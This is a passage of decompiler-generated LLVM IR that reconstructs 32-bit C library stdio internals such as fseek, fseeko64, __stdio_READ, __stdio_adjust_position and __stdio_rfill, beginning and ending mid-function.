  %v1_8053255 = inttoptr i32 %tmp4 to %pollfd*
  %v5_805325c = call i32 @poll(%pollfd* %v1_8053255, i32 %tmp3, i32 %tmp)
  store i32 %v0_8053254, i32* @ebx, align 4
  store i32 %v5_805325c, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_805325c, -4095
  br i1 %tmp10, label %dec_label_pc_8053274, label %dec_label_pc_8053268

dec_label_pc_8053268:                             ; preds = %entry
  %v1_8053268 = call i32 @__errno_location(i32 %v0_8053254)
  %v0_805326d = load i32, i32* %edi.global-to-local, align 4
  %v1_805326d = sub i32 0, %v0_805326d
  %v2_805326f = inttoptr i32 %v1_8053268 to i32*
  store i32 %v1_805326d, i32* %v2_805326f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8053274

dec_label_pc_8053274:                             ; preds = %entry, %dec_label_pc_8053268
  %v0_8053274 = phi i32 [ %v5_805325c, %entry ], [ -1, %dec_label_pc_8053268 ]
  %v2_8053278 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053278, i32* @edi, align 4
  ret i32 %v0_8053274

; uselistorder directives
  uselistorder i32 %v5_805325c, { 1, 0, 2 }
  uselistorder i32 %v0_8053254, { 1, 0 }
  uselistorder label %dec_label_pc_8053274, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8053287 = ashr i32 %arg2, 31
  %v4_805328e = inttoptr i32 %arg1 to i16*
  %v5_805328e = call i32 @__GI_fseeko64(i16* %v4_805328e, i32 %arg2, i32 %v1_8053287, i32 %arg3)
  ret i32 %v5_805328e
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053298 = load i32, i32* @ebp, align 4
  %v0_8053299 = load i32, i32* @edi, align 4
  %v0_805329a = load i32, i32* @esi, align 4
  %v0_805329b = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_80532ab = ptrtoint i16* %arg1 to i32
  store i32 %v4_80532ab, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_80532cf, label %dec_label_pc_80532bc

dec_label_pc_80532bc:                             ; preds = %entry
  %v1_80532bc = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_80532bc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_80532c4 = inttoptr i32 %v1_80532bc to i32*
  store i32 22, i32* %v1_80532c4, align 4
  br label %dec_label_pc_8053371

dec_label_pc_80532cf:                             ; preds = %entry
  %v1_80532cf = add i32 %v4_80532ab, 52
  %v2_80532cf = inttoptr i32 %v1_80532cf to i32*
  %v3_80532cf = load i32, i32* %v2_80532cf, align 4
  %v1_80532d2 = icmp eq i32 %v3_80532cf, 0
  %v1_80532d4 = icmp eq i1 %v1_80532d2, false
  br i1 %v1_80532d4, label %dec_label_pc_80532f5, label %dec_label_pc_80532d6

dec_label_pc_80532d6:                             ; preds = %dec_label_pc_80532cf
  %v1_80532d6 = add i32 %v4_80532ab, 56
  store i32 %v1_80532d6, i32* @ebx, align 4
  %v2_80532e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80532e0, i32* @eax, align 4
  %v3_80532e5 = call i32 @__pthread_return_void(i32 %v2_80532e0, i32 134550743)
  store i32 %v3_80532e5, i32* %eax.global-to-local, align 4
  %v0_80532ea = load i32, i32* @ebx, align 4
  %v2_80532ed = call i32 @__pthread_return_0(i32 %v0_80532ea)
  store i32 %v2_80532ed, i32* %eax.global-to-local, align 4
  %v0_80532f5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80532f5

dec_label_pc_80532f5:                             ; preds = %dec_label_pc_80532cf, %dec_label_pc_80532d6
  %v0_80532fd = phi i32 [ %v4_80532ab, %dec_label_pc_80532cf ], [ %v0_80532f5.pre, %dec_label_pc_80532d6 ]
  %v1_80532f5 = inttoptr i32 %v0_80532fd to i8*
  %v2_80532f5 = load i8, i8* %v1_80532f5, align 1
  %v3_80532f5 = and i8 %v2_80532f5, 64
  %v4_80532f5 = icmp eq i8 %v3_80532f5, 0
  br i1 %v4_80532f5, label %dec_label_pc_805330a, label %dec_label_pc_80532fa

dec_label_pc_80532fa:                             ; preds = %dec_label_pc_80532f5
  %v2_80532fe = call i32 @__stdio_wcommit(i32 %v0_80532fd)
  store i32 %v2_80532fe, i32* %eax.global-to-local, align 4
  %v1_8053306 = icmp eq i32 %v2_80532fe, 0
  %v1_8053308 = icmp eq i1 %v1_8053306, false
  br i1 %v1_8053308, label %dec_label_pc_8053359, label %dec_label_pc_805330a

dec_label_pc_805330a:                             ; preds = %dec_label_pc_80532fa, %dec_label_pc_80532f5
  %v0_805330a = load i32, i32* @edi, align 4
  %v9_805330a = icmp eq i32 %v0_805330a, 1
  %v1_805330d = icmp eq i1 %v9_805330a, false
  br i1 %v1_805330d, label %dec_label_pc_805330a.dec_label_pc_8053323_crit_edge, label %dec_label_pc_805330f

dec_label_pc_805330a.dec_label_pc_8053323_crit_edge: ; preds = %dec_label_pc_805330a
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8053323

dec_label_pc_805330f:                             ; preds = %dec_label_pc_805330a
  %v0_805330f = load i32, i32* @ecx, align 4
  %v2_8053311 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8053311, i32* %eax.global-to-local, align 4
  %v0_8053316 = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_8053316 to i32*
  %v6_8053317 = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_8053311, i32 %v0_805330f, i32 %v0_805330f)
  store i32 %v6_8053317, i32* %eax.global-to-local, align 4
  %v2_805331f = icmp slt i32 %v6_8053317, 0
  br i1 %v2_805331f, label %dec_label_pc_8053359, label %dec_label_pc_805330f.dec_label_pc_8053323_crit_edge

dec_label_pc_805330f.dec_label_pc_8053323_crit_edge: ; preds = %dec_label_pc_805330f
  %v0_8053324.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053323

dec_label_pc_8053323:                             ; preds = %dec_label_pc_805330a.dec_label_pc_8053323_crit_edge, %dec_label_pc_805330f.dec_label_pc_8053323_crit_edge
  %v2_8053325.pre-phi = phi i32 [ %.pre6, %dec_label_pc_805330a.dec_label_pc_8053323_crit_edge ], [ %v2_8053311, %dec_label_pc_805330f.dec_label_pc_8053323_crit_edge ]
  %v0_8053324 = phi i32 [ %v0_805330a, %dec_label_pc_805330a.dec_label_pc_8053323_crit_edge ], [ %v0_8053324.pre, %dec_label_pc_805330f.dec_label_pc_8053323_crit_edge ]
  %v0_8053323 = load i32, i32* @edx, align 4
  store i32 %v2_8053325.pre-phi, i32* %eax.global-to-local, align 4
  %v0_805332a = load i32, i32* @esi, align 4
  %v5_805332b = inttoptr i32 %v2_8053325.pre-phi to i32*
  %v6_805332b = call i32 @__stdio_seek(i32 %v0_805332a, i32* %v5_805332b, i32 %v0_8053324, i32 %v0_8053323)
  store i32 %v6_805332b, i32* %eax.global-to-local, align 4
  %v2_8053333 = icmp slt i32 %v6_805332b, 0
  br i1 %v2_8053333, label %dec_label_pc_8053359, label %dec_label_pc_8053337

dec_label_pc_8053337:                             ; preds = %dec_label_pc_8053323
  %v0_8053337 = load i32, i32* @esi, align 4
  %v1_8053337 = inttoptr i32 %v0_8053337 to i16*
  %v2_8053337 = load i16, i16* %v1_8053337, align 2
  %v3_8053337 = and i16 %v2_8053337, -72
  store i16 %v3_8053337, i16* %v1_8053337, align 2
  %v0_805333b = load i32, i32* @esi, align 4
  %v1_805333b = add i32 %v0_805333b, 8
  %v2_805333b = inttoptr i32 %v1_805333b to i32*
  %v3_805333b = load i32, i32* %v2_805333b, align 4
  store i32 %v3_805333b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_8053340 = add i32 %v0_805333b, 16
  %v3_8053340 = inttoptr i32 %v2_8053340 to i32*
  store i32 %v3_805333b, i32* %v3_8053340, align 4
  %v0_8053343 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053343 = load i32, i32* @esi, align 4
  %v2_8053343 = add i32 %v1_8053343, 20
  %v3_8053343 = inttoptr i32 %v2_8053343 to i32*
  store i32 %v0_8053343, i32* %v3_8053343, align 4
  %v0_8053346 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053346 = load i32, i32* @esi, align 4
  %v2_8053346 = add i32 %v1_8053346, 24
  %v3_8053346 = inttoptr i32 %v2_8053346 to i32*
  store i32 %v0_8053346, i32* %v3_8053346, align 4
  %v0_8053349 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053349 = load i32, i32* @esi, align 4
  %v2_8053349 = add i32 %v1_8053349, 28
  %v3_8053349 = inttoptr i32 %v2_8053349 to i32*
  store i32 %v0_8053349, i32* %v3_8053349, align 4
  %v0_805334c = load i32, i32* @esi, align 4
  %v1_805334c = add i32 %v0_805334c, 44
  %v2_805334c = inttoptr i32 %v1_805334c to i32*
  store i32 0, i32* %v2_805334c, align 4
  %v0_8053353 = load i32, i32* @esi, align 4
  %v1_8053353 = add i32 %v0_8053353, 2
  %v2_8053353 = inttoptr i32 %v1_8053353 to i8*
  store i8 0, i8* %v2_8053353, align 1
  br label %dec_label_pc_805335c

dec_label_pc_8053359:                             ; preds = %dec_label_pc_8053323, %dec_label_pc_805330f, %dec_label_pc_80532fa
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805335c

dec_label_pc_805335c:                             ; preds = %dec_label_pc_8053337, %dec_label_pc_8053359
  br i1 %v1_80532d4, label %dec_label_pc_8053371, label %dec_label_pc_8053360

dec_label_pc_8053360:                             ; preds = %dec_label_pc_805335c
  %v2_8053364 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8053364, i32* @eax, align 4
  %v3_8053369 = call i32 @__pthread_return_void(i32 %v2_8053364, i32 1)
  store i32 %v3_8053369, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053371

dec_label_pc_8053371:                             ; preds = %dec_label_pc_805335c, %dec_label_pc_80532bc, %dec_label_pc_8053360
  %v0_8053374 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053374, i32* %eax.global-to-local, align 4
  store i32 %v0_805329b, i32* @ebx, align 4
  store i32 %v0_805329a, i32* @esi, align 4
  store i32 %v0_8053299, i32* @edi, align 4
  store i32 %v0_8053298, i32* @ebp, align 4
  ret i32 %v0_8053374

; uselistorder directives
  uselistorder i32 %v2_8053325.pre-phi, { 1, 0 }
  uselistorder i32 %v0_805330a, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 22, 21, 20, 19, 18, 17, 16, 3, 27, 33, 32, 14, 2, 1, 0, 10, 31, 9, 15, 6, 5, 23, 8, 7, 30, 13, 29, 4, 12, 11, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 45, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 1, 0, 47, 46, 59, 58, 57, 56, 21, 20, 13, 12, 55, 54, 11, 10, 23, 22, 5, 4, 3, 2, 38, 37, 9, 8, 7, 6, 53, 52, 19, 18, 51, 50, 17, 16, 15, 14, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134550743, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 14, 15, 16, 17, 18, 23, 24, 25, 26, 19 }
  uselistorder i32 52, { 7, 1, 12, 0, 2, 3, 4, 13, 14, 5, 10, 6, 8, 15, 11, 9 }
  uselistorder i32 22, { 8, 14, 2, 3, 4, 5, 6, 13, 12, 9, 10, 11, 15, 7, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053371, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805335c, { 1, 0 }
  uselistorder label %dec_label_pc_8053323, { 1, 0 }
  uselistorder label %dec_label_pc_80532f5, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805337c = load i32, i32* @ebx, align 4
  store i32 %v0_805337c, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_8053382 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053382, i32* @ebx, align 4
  %v1_805338a = bitcast i16* %arg1 to i8*
  %v2_805338a = load i8, i8* %v1_805338a, align 1
  %v3_805338a = and i8 %v2_805338a, 4
  %v4_805338a = icmp eq i8 %v3_805338a, 0
  %v1_805338d = icmp eq i1 %v4_805338a, false
  br i1 %v1_805338d, label %dec_label_pc_80533bc, label %dec_label_pc_805338f

dec_label_pc_805338f:                             ; preds = %entry
  %v2_805338f = icmp slt i32 %arg3, 0
  %v1_8053391 = icmp eq i1 %v2_805338f, false
  br i1 %v1_8053391, label %dec_label_pc_8053398, label %dec_label_pc_8053393

dec_label_pc_8053393:                             ; preds = %dec_label_pc_805338f
  br label %dec_label_pc_8053398

dec_label_pc_8053398:                             ; preds = %dec_label_pc_805338f, %dec_label_pc_8053393
  %v0_8053399 = phi i32 [ %arg3, %dec_label_pc_805338f ], [ 2147483647, %dec_label_pc_8053393 ]
  %v1_805339e = add i32 %v4_8053382, 4
  %v2_805339e = inttoptr i32 %v1_805339e to i32*
  %v3_805339e = load i32, i32* %v2_805339e, align 4
  %v3_80533a1 = inttoptr i32 %arg2 to i32*
  %v4_80533a1 = call i32 @__libc_read(i32 %v3_805339e, i32* %v3_80533a1, i32 %v0_8053399)
  store i32 %v4_80533a1, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_80533a1, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80533bc, label %dec_label_pc_80533ae

dec_label_pc_80533ae:                             ; preds = %dec_label_pc_8053398
  %v1_80533a9 = icmp eq i32 %v4_80533a1, 0
  %v4_80533ac = icmp eq i1 %v1_80533a9, false
  %v0_80533b6 = load i32, i32* @ebx, align 4
  %v1_80533b6 = inttoptr i32 %v0_80533b6 to i16*
  %v2_80533b6 = load i16, i16* %v1_80533b6, align 2
  br i1 %v4_80533ac, label %dec_label_pc_80533b6, label %dec_label_pc_80533b0

dec_label_pc_80533b0:                             ; preds = %dec_label_pc_80533ae
  %v3_80533b0 = or i16 %v2_80533b6, 4
  store i16 %v3_80533b0, i16* %v1_80533b6, align 2
  %v0_80533bf.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533bc

dec_label_pc_80533b6:                             ; preds = %dec_label_pc_80533ae
  %v3_80533b6 = or i16 %v2_80533b6, 8
  store i16 %v3_80533b6, i16* %v1_80533b6, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80533bc

dec_label_pc_80533bc:                             ; preds = %dec_label_pc_8053398, %entry, %dec_label_pc_80533b0, %dec_label_pc_80533b6
  %v0_80533bf = phi i32 [ %v4_80533a1, %dec_label_pc_8053398 ], [ 0, %entry ], [ %v0_80533bf.pre, %dec_label_pc_80533b0 ], [ 0, %dec_label_pc_80533b6 ]
  %v2_80533be = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80533be, i32* @ebx, align 4
  ret i32 %v0_80533bf

; uselistorder directives
  uselistorder i16 %v2_80533b6, { 1, 0 }
  uselistorder i32 %v4_80533a1, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_read, { 1, 0, 2 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80533bc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8053398, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80533d0 = load i32, i32* %arg1, align 4
  store i32 %v2_80533d0, i32* %esi.global-to-local, align 4
  %v1_80533d7 = urem i32 %v2_80533d0, 4
  %v2_80533d7 = icmp eq i32 %v1_80533d7, 0
  store i32 %v1_80533d7, i32* %ecx.global-to-local, align 4
  br i1 %v2_80533d7, label %dec_label_pc_8053406, label %dec_label_pc_80533dc

dec_label_pc_80533dc:                             ; preds = %entry
  %v1_80533de = add nsw i32 %v1_80533d7, -1
  %v8_80533de = icmp eq i32 %v1_80533de, 0
  store i32 %v1_80533de, i32* @edx, align 4
  br i1 %v8_80533de, label %dec_label_pc_8053406, label %dec_label_pc_80533e1

dec_label_pc_80533e1:                             ; preds = %dec_label_pc_80533dc
  %v3_80533e1 = and i32 %v2_80533d0, 2048
  %v4_80533e1 = icmp eq i32 %v3_80533e1, 0
  br i1 %v4_80533e1, label %dec_label_pc_8053406, label %dec_label_pc_80533e6

dec_label_pc_80533e6:                             ; preds = %dec_label_pc_80533e1
  %v6_80533e6 = sub nsw i32 1, %v1_80533d7
  %v7_80533e6 = and i32 %v1_80533de, %v6_80533e6
  %v8_80533e6 = icmp slt i32 %v7_80533e6, 0
  %v9_80533e6 = icmp eq i32 %v1_80533d7, 2
  %v10_80533e6 = icmp ult i32 %v1_80533d7, 2
  %v3_80533e9 = icmp eq i1 %v10_80533e6, %v8_80533e6
  %v4_80533e9 = icmp eq i1 %v9_80533e6, false
  %v5_80533e9 = and i1 %v4_80533e9, %v3_80533e9
  br i1 %v5_80533e9, label %dec_label_pc_805345c, label %dec_label_pc_80533eb

dec_label_pc_80533eb:                             ; preds = %dec_label_pc_80533e6
  %v1_80533eb = add i32 %tmp6, 40
  %v2_80533eb = inttoptr i32 %v1_80533eb to i32*
  %v3_80533eb = load i32, i32* %v2_80533eb, align 4
  %v4_80533eb = icmp eq i32 %v3_80533eb, 0
  %v1_80533ef = icmp eq i1 %v4_80533eb, false
  br i1 %v1_80533ef, label %dec_label_pc_805345c, label %dec_label_pc_80533f1

dec_label_pc_80533f1:                             ; preds = %dec_label_pc_80533eb
  %v1_80533f1 = add i32 %tmp6, 3
  %v2_80533f1 = inttoptr i32 %v1_80533f1 to i8*
  %v3_80533f1 = load i8, i8* %v2_80533f1, align 1
  %v4_80533f1 = zext i8 %v3_80533f1 to i32
  %v2_80533f5 = sub nsw i32 %v1_80533de, %v4_80533f1
  %v1_80533f7 = add i32 %tmp6, 44
  %v2_80533f7 = inttoptr i32 %v1_80533f7 to i32*
  %v3_80533f7 = load i32, i32* %v2_80533f7, align 4
  %v1_80533fb = add nsw i32 %v2_80533f5, -1
  %tmp12 = icmp slt i32 %v3_80533f7, 1
  br i1 %tmp12, label %dec_label_pc_8053406, label %dec_label_pc_8053400

dec_label_pc_8053400:                             ; preds = %dec_label_pc_80533f1
  %v1_8053400 = add i32 %tmp6, 2
  %v2_8053400 = inttoptr i32 %v1_8053400 to i8*
  %v3_8053400 = load i8, i8* %v2_8053400, align 1
  %v4_8053400 = zext i8 %v3_8053400 to i32
  %v2_8053404 = sub nsw i32 %v1_80533fb, %v4_8053400
  br label %dec_label_pc_8053406

dec_label_pc_8053406:                             ; preds = %dec_label_pc_80533f1, %dec_label_pc_80533e1, %dec_label_pc_80533dc, %entry, %dec_label_pc_8053400
  %v0_805341d = phi i32 [ %v1_80533fb, %dec_label_pc_80533f1 ], [ %v1_80533de, %dec_label_pc_80533e1 ], [ 0, %dec_label_pc_80533dc ], [ 0, %entry ], [ %v2_8053404, %dec_label_pc_8053400 ]
  %v2_8053406 = and i32 %v2_80533d0, 64
  %v3_8053406 = icmp eq i32 %v2_8053406, 0
  %storemerge.in.in.v = select i1 %v3_8053406, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8053415 = add i32 %tmp6, 16
  %v3_8053415 = inttoptr i32 %v2_8053415 to i32*
  %v4_8053415 = load i32, i32* %v3_8053415, align 4
  %v5_8053415 = sub i32 %storemerge, %v4_8053415
  %v1_8053418 = inttoptr i32 %arg2 to i32*
  %v2_8053418 = load i32, i32* %v1_8053418, align 4
  store i32 %v2_8053418, i32* %ecx.global-to-local, align 4
  %v1_805341a = add i32 %arg2, 4
  %v2_805341a = inttoptr i32 %v1_805341a to i32*
  %v3_805341a = load i32, i32* %v2_805341a, align 4
  store i32 %v3_805341a, i32* %ebx.global-to-local, align 4
  %v2_805341d = add i32 %v5_8053415, %v0_805341d
  store i32 %v2_805341d, i32* %esi.global-to-local, align 4
  %v2_8053428 = ashr i32 %v2_805341d, 31
  %v5_8053431 = sub i32 %v2_8053418, %v2_805341d
  %v10_8053431 = icmp ult i32 %v2_8053418, %v2_805341d
  %v6_8053435 = zext i1 %v10_8053431 to i32
  %tmp = icmp slt i32 %v2_805341d, 0
  %v2_8053428.neg = zext i1 %tmp to i32
  %v7_8053435 = add i32 %v3_805341a, %v2_8053428.neg
  %v8_8053435 = add i32 %v7_8053435, %v6_8053435
  store i32 %v8_8053435, i32* @edx, align 4
  store i32 %v5_8053431, i32* %v1_8053418, align 4
  %v0_805343b = load i32, i32* @edx, align 4
  %v1_805343b = load i32, i32* %edi.global-to-local, align 4
  %v2_805343b = add i32 %v1_805343b, 4
  %v3_805343b = inttoptr i32 %v2_805343b to i32*
  store i32 %v0_805343b, i32* %v3_805343b, align 4
  %v0_805343e = load i32, i32* %edi.global-to-local, align 4
  %v1_805343e = add i32 %v0_805343e, 4
  %v2_805343e = inttoptr i32 %v1_805343e to i32*
  %v3_805343e = load i32, i32* %v2_805343e, align 4
  %v4_805343e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8053441 = icmp slt i32 %v3_805343e, %v4_805343e
  br i1 %v5_8053441, label %dec_label_pc_805344b, label %dec_label_pc_8053443

dec_label_pc_8053443:                             ; preds = %dec_label_pc_8053406
  %v8_8053443 = icmp sgt i32 %v3_805343e, %v4_805343e
  br i1 %v8_8053443, label %dec_label_pc_8053449, label %dec_label_pc_8053445

dec_label_pc_8053445:                             ; preds = %dec_label_pc_8053443
  %v1_8053445 = inttoptr i32 %v0_805343e to i32*
  %v2_8053445 = load i32, i32* %v1_8053445, align 4
  %v3_8053445 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8053445, %v3_8053445
  br i1 %tmp14, label %dec_label_pc_8053449, label %dec_label_pc_805344b

dec_label_pc_8053449:                             ; preds = %dec_label_pc_8053445, %dec_label_pc_8053443
  %v0_8053449 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053449 = sub i32 0, %v0_8053449
  store i32 %v1_8053449, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805344b

dec_label_pc_805344b:                             ; preds = %dec_label_pc_8053445, %dec_label_pc_8053406, %dec_label_pc_8053449
  %v0_805344b = load i32, i32* %esi.global-to-local, align 4
  %v2_805344b = icmp slt i32 %v0_805344b, 0
  %v1_805344d = icmp eq i1 %v2_805344b, false
  br i1 %v1_805344d, label %dec_label_pc_805345f, label %dec_label_pc_805344f

dec_label_pc_805344f:                             ; preds = %dec_label_pc_805344b
  %v1_805344f = call i32 @__errno_location(i32 %v2_8053428)
  %v1_8053454 = inttoptr i32 %v1_805344f to i32*
  store i32 75, i32* %v1_8053454, align 4
  %v0_8053462.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805345f

dec_label_pc_805345c:                             ; preds = %dec_label_pc_80533eb, %dec_label_pc_80533e6
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805345f

dec_label_pc_805345f:                             ; preds = %dec_label_pc_805344b, %dec_label_pc_805344f, %dec_label_pc_805345c
  %v0_8053462 = phi i32 [ %v0_805344b, %dec_label_pc_805344b ], [ %v0_8053462.pre, %dec_label_pc_805344f ], [ -1, %dec_label_pc_805345c ]
  ret i32 %v0_8053462

; uselistorder directives
  uselistorder i32 %v4_805343e, { 1, 0 }
  uselistorder i32 %v3_805343e, { 1, 0 }
  uselistorder i32 %v1_80533de, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_80533d7, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_80533d0, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 2, 1, 6, 3, 5, 0, 8, 4, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805345f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805344b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053406, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8053468 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8053470 = add i32 %arg1, 8
  %v2_8053470 = inttoptr i32 %v1_8053470 to i32*
  %v3_8053470 = load i32, i32* %v2_8053470, align 4
  store i32 %v3_8053470, i32* %edx.global-to-local, align 4
  %v1_8053473 = add i32 %arg1, 12
  %v2_8053473 = inttoptr i32 %v1_8053473 to i32*
  %v3_8053473 = load i32, i32* %v2_8053473, align 4
  %v2_8053476 = sub i32 %v3_8053473, %v3_8053470
  %v3_805347b = inttoptr i32 %arg1 to i16*
  %v4_805347b = call i32 @__stdio_READ(i16* %v3_805347b, i32 %v3_8053470, i32 %v2_8053476)
  %v0_8053480 = load i32, i32* @ebx, align 4
  %v1_8053480 = add i32 %v0_8053480, 8
  %v2_8053480 = inttoptr i32 %v1_8053480 to i32*
  %v3_8053480 = load i32, i32* %v2_8053480, align 4
  store i32 %v3_8053480, i32* %edx.global-to-local, align 4
  %v2_8053483 = add i32 %v0_8053480, 16
  %v3_8053483 = inttoptr i32 %v2_8053483 to i32*
  store i32 %v3_8053480, i32* %v3_8053483, align 4
  %v0_8053486 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053486 = add i32 %v0_8053486, %v4_805347b
  store i32 %v2_8053486, i32* %edx.global-to-local, align 4
  %v1_8053488 = load i32, i32* @ebx, align 4
  %v2_8053488 = add i32 %v1_8053488, 20
  %v3_8053488 = inttoptr i32 %v2_8053488 to i32*
  store i32 %v2_8053486, i32* %v3_8053488, align 4
  store i32 %v0_8053468, i32* @ebx, align 4
  ret i32 %v4_805347b

; uselistorder directives
  uselistorder i32 %v4_805347b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8053490 = load i32, i32* @ebx, align 4
  %v4_8053494 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053494, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_805349c = bitcast i16* %arg1 to i32*
  %v2_805349c = load i32, i32* %v1_805349c, align 4
  %v1_805349e = urem i32 %v2_805349c, 65536
  %v2_80534a1 = and i32 %v1_805349e, %arg2
  %v3_80534a1 = icmp eq i32 %v2_80534a1, 0
  %v1_80534a3 = icmp eq i1 %v3_80534a1, false
  br i1 %v1_80534a3, label %dec_label_pc_80534b2, label %dec_label_pc_80534a5

dec_label_pc_80534a5:                             ; preds = %entry
  %v1_80534a5 = and i32 %v2_805349c, 2176
  %v2_80534a5 = icmp eq i32 %v1_80534a5, 0
  %v1_80534ab = icmp eq i1 %v2_80534a5, false
  br i1 %v1_80534ab, label %dec_label_pc_80534b9, label %dec_label_pc_80534ad

dec_label_pc_80534ad:                             ; preds = %dec_label_pc_80534a5
  %v2_80534ad = or i32 %v2_805349c, %arg2
  %v1_80534af = trunc i32 %v2_80534ad to i16
  store i16 %v1_80534af, i16* %arg1, align 2
  %v0_80534b2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80534b2

dec_label_pc_80534b2:                             ; preds = %entry, %dec_label_pc_80534ad
  %v0_80534d4 = phi i32 [ %v4_8053494, %entry ], [ %v0_80534b2.pre, %dec_label_pc_80534ad ]
  %v1_80534b2 = inttoptr i32 %v0_80534d4 to i16*
  %v2_80534b2 = load i16, i16* %v1_80534b2, align 2
  %v2_80534b5 = and i16 %v2_80534b2, 16
  %v3_80534b5 = icmp eq i16 %v2_80534b5, 0
  br i1 %v3_80534b5, label %dec_label_pc_80534cd, label %dec_label_pc_80534b9

dec_label_pc_80534b9:                             ; preds = %dec_label_pc_80534b2, %dec_label_pc_80534a5
  %v1_80534b9 = call i32 @__errno_location(i32 %v0_8053490)
